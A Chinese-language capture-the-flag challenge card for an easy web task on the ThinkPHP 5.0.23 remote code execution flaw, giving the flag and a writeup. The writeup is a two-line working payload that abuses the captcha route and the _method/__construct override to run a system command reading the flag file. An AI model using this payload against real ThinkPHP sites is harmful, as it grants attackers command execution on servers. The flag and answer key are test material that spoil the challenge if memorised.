- **题目名称：** thinkphp
- **题目类型：** WEB
- **题目难度：** 容易 
- **出题人：** ABU
- **考点：**

1. thinkphp 5.0.23 rce

- **描述：** php最常见的框架，不会有人不知道吧

- **flag：** flag{ewyg_wyuf_ushg_dgds_dgfs!}

- **Writeup：** 

  payload如下

  ```php
  get:/public/index.php?s=captcha 
  post:_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=cat /FL4G
  ```

  

